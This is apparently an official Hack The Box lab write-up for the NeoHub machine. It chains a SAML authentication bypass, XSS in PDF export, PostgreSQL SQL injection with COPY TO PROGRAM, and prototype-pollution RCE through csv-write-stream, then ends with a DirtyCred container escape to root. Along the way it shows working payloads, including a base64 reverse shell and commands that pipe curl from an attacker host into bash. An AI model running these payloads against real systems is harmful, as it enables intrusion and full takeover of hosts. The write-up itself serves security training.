![](./assets/banner.png)

 <img src="./assets/htb.png" style="margin-left: 20px; zoom: 80%;" align=left />	<font size="10">NeoHub</font> 			

​         29<sup>th</sup> April 2024 / Document No DYY.100.XX 

​	 Prepared By: Xclow3n 	

​	 Machine Author:  Xclow3n

​	 Difficulty: <font color=orange>Medium</font>		

​	 Classification: Official	 	





# Enumeration

Starting with a port scan

```bash
$ nmap -sTVC 10.129.231.37
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 aff6d1987f69b3350044e73ae485b14a (ECDSA)
|_  256 2e1d1f81f2c18a6359ac7b869aba4a09 (ED25519)
80/tcp open  http    nginx 1.22.0 (Ubuntu)
|_http-title: Neoprint
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.50 seconds
```

After visiting port 80, we are redirected to `neohub.htb`. Adding it to our `/etc/hosts` reveals a login page.

![img](assets/login.png)

Clicking on the login button redirects us to `auth.neohub.htb`, where it is possible to register a new user, indicating a Single Sign-On (SSO) system is in use.

![img](assets/ke.png)

Post-registration, we are redirected back to `neohub.htb`.

![img](assets/d.png)

With limited options available, we proceed to search for virtual hosts using `ffuf`:

```bash
ffuf -u http://10.129.231.37 -H 'Host: FUZZ.neohub.htb' -w subdomains-top1million-110000.txt -fs 178
```

The search reveals three virtual hosts:

```bash
[Status: 200, Size: 240, Words: 53, Lines: 8, Duration: 284ms]
    * FUZZ: backup

[Status: 200, Size: 3510, Words: 672, Lines: 83, Duration: 328ms]
    * FUZZ: auth

[Status: 200, Size: 3222, Words: 949, Lines: 97, Duration: 240ms]
    * FUZZ: blueprint

```

We add these to `/etc/hosts` and explore `backup`, which appears interesting.

![img](assets/ba.png)

Here, we download `neoprint.zip` and examine its contents, leading us to `blueprint.neohub.htb`.

![img](assets/ne.png)

Attempting to log into `blueprint.neohub.htb` triggers an error message.

![img](assets/fa.png)

### Investigating the Backup

![img](assets/dire.png)

The `crewjam/saml v0.4.8` library is particularly noteworthy due to its known vulnerabilities, specifically one that allows for an authentication bypass (https://github.com/crewjam/saml/security/advisories/GHSA-j2jp-wvqg-wc2g).

```
require (
	github.com/crewjam/saml v0.4.8
	github.com/go-chi/chi/v5 v5.0.12
)
```

We also discover database credentials within `cmd/web/main.go`:

```go
dbCon := db.InitDB("postgresql://neohub:neohubpass@postgresql.htb:5432/neohubdb?sslmode=disable")
```

### Understanding the Vulnerability

SAML (Security Assertion Markup Language) is used for exchanging authentication and authorization data between parties. By adding multiple `assertions`, an attacker can manipulate the SAML response to bypass signature checks. This is crucial because, if an application does not properly verify the signature of each assertion, it may trust manipulated data.

### Analyzing the Middleware

Looking at the following middleware code snippet from the `neoprint` code base defined in `pkg/middleware/middleware.go`:

```go
func HasAccess() func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            if needsAuthentication(r) {
                s := samlsp.SessionFromContext(r.Context())
                if s == nil {
                    http.Error(w, "Not authenticated", http.StatusForbidden)
                    return
                }
                sa, ok := s.(samlsp.SessionWithAttributes)
                if !ok {
                    http.Error(w, "Not a session with attributes", http.StatusForbidden)
                    return
                }

                as := sa.GetAttributes()
                hasAccess := false
                for k, v := range as {
                    if k == "Role" {
                        for _, x := range v {
                            if x == "admin" {
                                hasAccess = true
                            }
                        }
                    }
                }

                if !hasAccess {
                    http.Redirect(w, r, "/?message=noaccess", http.StatusFound)
                }
                next.ServeHTTP(w, r)
            } else {
                next.ServeHTTP(w, r)
            }
        })
    }
}
```

This code demonstrates how the middleware checks for an `admin` role within the SAML assertion attributes to grant access. If the `admin` role is missing, access is denied.

### Exploiting the Vulnerability

To exploit this vulnerability, we would have to intercept and modify the SAML response during the Single Sign-On (SSO) process. This is the SAML response:

```http
POST /saml/acs HTTP/1.1
Host: blueprint.neohub.htb
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 7985
Origin: null
Connection: close
Cookie: saml_PZfLTb...SNIP...
Upgrade-Insecure-Requests: 1

SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6c...SNIP...
```

Upon receiving the base64 encoded `SAMLResponse`, we would decode it to find and manipulate the assertions:

```
xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ...>
    <saml:Assertion ...>
        <saml:Attribute Name="Role" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
            <saml:AttributeValue>manage-account</saml:AttributeValue>
        </saml:Attribute>
        ...
    </saml:Assertion>
</samlp:Response>
```

According to the advisory we can exploit it by duplicating the `Assertion` block and modifying the role to `admin`, then removing the digital signature from the duplicated assertion, we could inject unauthorized roles. This modification, if not properly checked by the application, could allow an attacker to escalate privileges to an admin without valid credentials.

And we are logged in

![img](assets/logged.png)

For each blueprint we can export it to PDF

![img](assets/expo.png)

Since we have the ability to add blueprints, let's explore the possibility of exploiting Cross-Site Scripting (XSS) vulnerabilities during the PDF generation process.

To test this, we will inject the following XSS payload into the `description` field of a blueprint:

```javascript
<script>
    test = new XMLHttpRequest();
    test.onload = function(){document.write(this.responseText)}
    test.onerror = function(){document.write('failed!')}
    test.open("GET","file:///etc/hosts");
    test.send();
</script>
```

Once the payload is added, we'll proceed to export it. If this initial attempt does not yield the expected results, we can try using a different approach to see if it works.

```javascript
<script>
    window.location.href = "file:///etc/hosts"
</script>
```

![img](assets/host.png)

It worked! We successfully retrieved the content of the `/etc/hosts` file, suggesting that the PDF generation occurs within a Docker instance. Notably, we spotted an entry for `tunnel.neohub.htb`.

Now, let’s redirect our focus to that URL to discover what lies there. Instead of adding another blueprint, we’ll employ the following payload to further investigate:

```javascript
<script src="http://IP:PORT/index.js"></script>
```

Redirecting the PDF generation to `tunnel.neohub.htb` revealed a Swagger API interface. This API documentation provides a structured overview of the available endpoints and their functionalities, allowing us to explore further interactions with the system.

![img](assets/swag.png)

Let's change our focus and redirect to the `/tunnels` endpoint to see what additional information we get.

```json
[
  {
    "id": 1,
    "name": "Main Tunnel",
    "details": {
      "location": "Sector 5",
      "status": "Operational",
      "safetyFeatures": {
        "emergencyExits": 3,
        "fireExtinguishers": 10
      }
    },
    "log_path": "./logs/5fa41a58-80f2-4d04-86dd-1a8ac3ea452d.log"
  },
  {
    "id": 2,
    "name": "Service Tunnel",
    "details": {
      "location": "Sector 7",
      "status": "Maintenance",
      "safetyFeatures": {
        "emergencyExits": 1,
        "fireExtinguishers": 4
      }
    },
    "log_path": "./logs/b6afc850-c6af-4578-9998-c2bb22302c92.log"
  },
  {
    "id": 3,
    "name": "Escape Route",
    "details": {
      "location": "Sector 3",
      "status": "Closed",
      "safetyFeatures": {
        "emergencyExits": 2,
        "fireExtinguishers": 6,
        "ventilationSystem": "Inoperative"
      }
    },
    "log_path": "./logs/43b8065f-53fa-4ee3-9225-8fd0682a8f56.log"
  },
  {
    "id": 4,
    "name": "Supply Tunnel",
    "details": {
      "location": "Sector 2",
      "status": "Operational",
      "logistics": {
        "loadCapacity": "2000kg",
        "accessRestrictions": "Robot-only access"
      }
    },
    "log_path": "./logs/765d93be-193e-483f-8de1-f0c3127cfa59.log"
  },
  {
    "id": 5,
    "name": "Emergency Exit 12",
    "details": {
      "location": "Sector 9",
      "status": "Operational",
      "safetyFeatures": {
        "emergencyExits": 5,
        "fireExtinguishers": 12,
        "surveillance": "24/7 Monitoring"
      }
    },
    "log_path": "./logs/ef6d42fa-69f1-46f4-aa2d-e1995ca660fd.log"
  },
  {
    "id": 6,
    "name": "Flood Escape",
    "details": {
      "location": "Sector 11",
      "status": "Under Repair",
      "safetyFeatures": {
        "emergencyExits": 3,
        "floodSensors": true
      }
    },
    "log_path": "./logs/6c6b4623-ba10-45fa-8012-592c7a7eb080.log"
  },
  {
    "id": 7,
    "name": "Utility Passage A2",
    "details": {
      "location": "Sector 1",
      "status": "Operational",
      "safetyFeatures": {
        "emergencyExits": 2,
        "fireExtinguishers": 5,
        "electricalSafety": "Up to Code"
      }
    },
    "log_path": "./logs/7c791768-984c-4cb9-a5f4-fc8db4c16760.log"
  },
  {
    "id": 8,
    "name": "Secret Entrance B",
    "details": {
      "location": "Sector 8",
      "status": "Restricted",
      "securityMeasures": {
        "accessLevel": "High Clearance",
        "guards": 2,
        "biometricAccess": true
      }
    },
    "log_path": "./logs/cecade9e-515b-4342-94da-cec7bb9392ec.log"
  }
]
```

A notable aspect of the data is the `log_path` field, along with the API's capability to read maintenance logs. If we can manipulate this column, it might allow us to read arbitrary files from the system. Let's explore this possibility by attempting SQL Injection on the `/tunnels/:id` endpoint.

We will use the following payload:

```javascript
window.location.href = 'http://tunnel.neohub.htb/tunnels/1 AND 1=2'
```

![img](assets/vul.png)

So its vulnerable to SQL Injection, let's try to perform union injection

```javascript
window.location.href = 'http://tunnel.neohub.htb/tunnels/1 UNION SELECT NULL,NULL,NULL,NULL'
```

![img](assets/union.png)

It appears that union injection is not feasible in this scenario. Before proceeding further, we should identify the database system in use. To do this, we'll test the database's behavior with a specific payload. If the following payload executes without error, it indicates that the database is MySQL.

```javascript
window.location.href = `http://tunnel.neohub.htb/tunnels/1 AND conv('a',16,2)=conv('a',16,2)`
```

![img](assets/err.png)

It does throw an error, let's try this one, it is for `PostgreSQL`

```javascript
window.location.href = `http://tunnel.neohub.htb/tunnels/1 AND 5::int=5`
```

![img](assets/iden.png)

Great, it turns out we are dealing with a PostgreSQL database. PostgreSQL allows stacked queries by default, which can be exploited for remote code execution (RCE). Using the database credentials obtained from the Golang backup, we can execute the following payload to leverage PostgreSQL's ability to execute external programs:

```sql
COPY (SELECT 1) TO PROGRAM 'id';
```

This command uses PostgreSQL's `COPY TO PROGRAM` feature, which is intended to write data to a program's standard input. By exploiting this feature, commands can be executed on the server hosting the database.

With this capability, we can attempt to gain a shell on the PostgreSQL container. Here's a script that could be used to execute a reverse shell, ensuring you replace the placeholder with your actual server details:

```javascript
window.location.href = `http://tunnel.neohub.htb/tunnels/1;COPY (SELECT 1) TO PROGRAM 'echo "L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM2LzQyNDIgMD4mMSc=" | base64 -d | sh';`
```

Make sure the server is listening on the specified port before running this command to successfully catch the reverse shell.



and we got the shell on postgres 

```bash
$ nc -nlvp 4242
Connection from 10.129.231.37:57338
bash: cannot set terminal process group (33): Inappropriate ioctl for device
bash: no job control in this shell
postgres@dca1087e26af:~/data$
```

Let's connect to the database using the following command

```bash
psql -U neohub -d neohubdb
```

Now that we're connected, let's explore the database structure by listing all the tables. We can use the following query to do so:

```sql
SELECT table_name
FROM information_schema.tables
WHERE table_schema = 'public';
```

```
 tunnels
 notifications
 blueprints
```

We've identified three tables; we're already familiar with the blueprint table from the neoprint system. Now, let's examine the notifications table for further details.

```sql
SELECT * FROM notifications;
 id |                          notification_text                          | notification_date | is_resolved
----+---------------------------------------------------------------------+-------------------+-------------
  1 | Patch the old tunneling API kernel it's vulnerable to CVE-2022-3910 | 2024-05-06        | f
  2 | Update all workstations by EOD Friday                               | 2024-05-06        | f
  3 | Review quarterly IT security training                               | 2023-10-01        | f
  4 | Replace expired SSL certificates for external services              | 2023-09-15        | t
(4 rows)
```

It appears that the old tunneling server is vulnerable to a kernel bug. Given that the application also features functionality to display maintenance logs, and now that we have access to the database, we might be able to escalate this to read arbitrary files.

```sql
SELECT * FROM tunnels WHERE id=1;
 id |    name     |                                                        details                                                         |                    log_path
----+-------------+------------------------------------------------------------------------------------------------------------------------+-------------------------------------------------
  1 | Main Tunnel | {"location":"Sector 5","status":"Operational","safetyFeatures.emergencyExits":3,"safetyFeatures.fireExtinguishers":10} | ./logs/5fa41a58-80f2-4d04-86dd-1a8ac3ea452d.log
(1 row)
```

Let's proceed by inserting a new tunnel entry with a modified `log_path` that could potentially be used for LFR (Local File Read).

```sql
INSERT INTO tunnels(name, details, log_path) VALUES('test', '{}', '/proc/self/cmdline');
```

Accessing `/proc/self/cmdline` will reveal the complete command line for the application's process, providing insights into the application type we are interacting with.

Since tools like `wget` or `curl` are not installed on the container, we'll leverage the PDF functionality to extract data.

Based on the Swagger API documentation, to retrieve logs, we need to make a request to the endpoint `/maintenance_logs/:tunnel_id`, where in this instance, the `tunnel_id` is 9.

```javascript
window.location.href = `http://tunnel.neohub.htb/maintenance_logs/9`;
```

![img](assets/exf.png)

We've determined that we're dealing with a Node.js application. To access the content of `index.js`, even though we're unsure of the exact path to where this application resides, we can make use of `/proc/self/cwd`. This directory is a symlink to the current working directory of the process, which can help us locate and retrieve the application's files.

```sql
UPDATE tunnels SET log_path='/proc/self/cwd/index.js';
```

![img](assets/gotin.png)

The formatting of the retrieved file might be off, but we can still correct it and analyze the underlying code base.

```javascript
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const routes = require('./routes');
const Database = require('./database');
const cors = require('cors');
const db = new Database();
app.use(cors());
app.use(bodyParser.urlencoded({
    extended: false
}));
app.use(express.json());
app.set('views', './views');
app.use('/static', express.static('./static'));
app.use(routes(db));
app.all('*', (req, res) => {
    return res.status(404).send({
        message: '404 page not found '
    });
});
app.use(function(err, req, res, next) {
    res.status(500).json({
        message: 'Something went wrong!'
    });
});

function delay(time) {
    return new Promise(resolve => setTimeout(resolve, time));
}
(async () => {
        console.log('Waiting 5 seconds before connecting to the database...');
        await
        delay(5000); // Wait for 5 seconds await db.connect(); await db.migrate(); app.listen(80, '0.0.0.0', ()
        => console.log('Listening on port 1337'));
})();
```

Let's obtain `database.js`, `./routes/index.js`, and `package.json`, and proceed to format the code for better readability.

Once we've done that, we can delve into specific functions, such as `fetchAllTunnels`, to better understand their implementation and functionality.

```javascript
fetchAllTunnels() {
            return new Promise((resolve, reject) => {
                    this.client.query('SELECT * FROM tunnels ') .then(res => { const 	                         result = res.rows.map(tunnel => { if (!tunnel) return null; try {                             return {
                        ...tunnel, details: tunnel.details ? unflat({
                            target: tunnel.details
                        }) : {}, log_path: tunnel.log_path
                    };
                } catch (error) {
                    return null;
                }
            }).filter(t => t !== null);resolve(result);
    }).catch(error => {
    reject(error);
});
```

The code essentially retrieves all tunnel records, iterating through each one and using the `unflat` method to transform stored string representations back into JSON objects. This is necessary because each tunnel has unique properties that are stored as strings in the database for uniformity, and need to be converted back for display and processing.

Upon examining the `package.json`, we notice that the application uses the `@homer0/object-utils` package, specifically version `3.0.3`, to handle the flatting and unflattening operations on data.

```json
"@homer0/object-utils": "3.0.3"
```

A visit to the npm page for `@homer0/object-utils` reveals that a newer version of the package is available. Further investigation into the GitHub repository of this package and examining the closed issues provides additional context on the changes and improvements made over time:

[GitHub repository issues for @homer0/object-utils](https://github.com/homer0/packages/issues?q=is%3Aissue+is%3Aclosed)

![img](assets/git.png)

This library is susceptible to prototype pollution in its older versions, allowing us to inject malicious data directly. However, achieving Remote Code Execution (RCE) presents a challenge, as the application does not utilize the `child_process` module or similar functionalities that would typically permit command execution.

Additionally, the application employs the `css-write-stream` module to export tunnel data as CSV files. To explore possible avenues for RCE, we can review resources like the KTH LangSec repository on server-side prototype pollution. This resource might reveal whether any npm packages used by the application are vulnerable to prototype pollution in a way that could be leveraged for RCE. 

You can check out the repository here for potential leads: [KTH LangSec Server-Side Prototype Pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution).

![img](assets/gad.png) 

The `csv-write-stream` module, which the application uses to export tunnel data as CSV files, is known to have a vulnerability that can be exploited for Remote Code Execution (RCE). Since this package is outdated and hasn't been updated with new versions, it remains vulnerable to attacks.

To exploit this vulnerability, we can add a malicious entry to the database that uses prototype pollution to trigger arbitrary code execution when the application processes CSV exports. Here’s how you can insert malicious data into the database:

```sql
INSERT INTO tunnels(name, log_path, details) VALUES('test', '/etc/hosts', '{"__proto__.separator":",\";process.mainModule.require(`child_process`).exec(`curl http://10.10.14.36/shell.sh | bash`);result+=\""}');
```

This SQL command inserts a new tunnel record with a specially crafted `details` field designed to exploit prototype pollution. This field modifies the behavior of the CSV writer to execute a shell command instead of merely writing text.

### Triggering the Exploit

1. **Pollute the Prototype**: Make a request to `/tunnels` which causes the application to fetch and 'unflatten' the data, leading to prototype pollution.
2. **Execute the Payload**: Subsequently, a request to `/export/tunnels` will trigger the CSV export process, utilizing the polluted object, and thereby executing the malicious code embedded within.

And we got shell

```bash
$ rlwrap nc -nlvp 4243
Connection from 10.129.231.37:59976
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@d00755fd1a0a:/app# ls /
ls /
app
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
user.txt
usr
var
root@d00755fd1a0a:/app#
```

Since we have identified that the application is vulnerable to  CVE-2022-3910, let’s further investigate this specific vulnerability to  understand its impact and possible exploitation methods.

![img](assets/google.png)

We discovered [this blog post](https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/) that outlines a method for escaping a container using the DirtyCred exploit. Let's use the guidance from this blog to attempt the exploit, especially since the blog provides the necessary exploit code.

We'll start by compiling the exploit and creating a script named `a.sh` as detailed in the blog. This step is crucial for preparing the exploit to run on the container.



This will be the content of `a.sh`

```bash
#!/bin/bash
/bin/bash -c 'curl http://10.10.14.36/shell.sh | bash'
```

We've transferred both the `exploit` binary and the `a.sh` script to the `/tmp` directory on the container.

Next, we'll make both files executable with the following commands:

```bash
chmod 777 exploit
chmod 777 a.sh
```

After setting the appropriate permissions, we execute the exploit:

```bash
./exploit
```

This process has now overwritten `modprobe`. To trigger the exploit and gain elevated privileges, we run:

```bash
./b
```

Successfully executing the above commands, we achieve root access and can now retrieve the flag. Here's how we confirmed our escalated privileges and accessed sensitive files:

```bash
$ nc -nlvp 1234
Connection from 10.129.231.37:51452
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@neohub:/# id
uid=0(root) gid=0(root) groups=0(root)
root@neohub:/# ls /root
root.txt
snap
root@neohub:/#
```

This sequence confirms that we have successfully exploited the vulnerability to gain root access on the system.
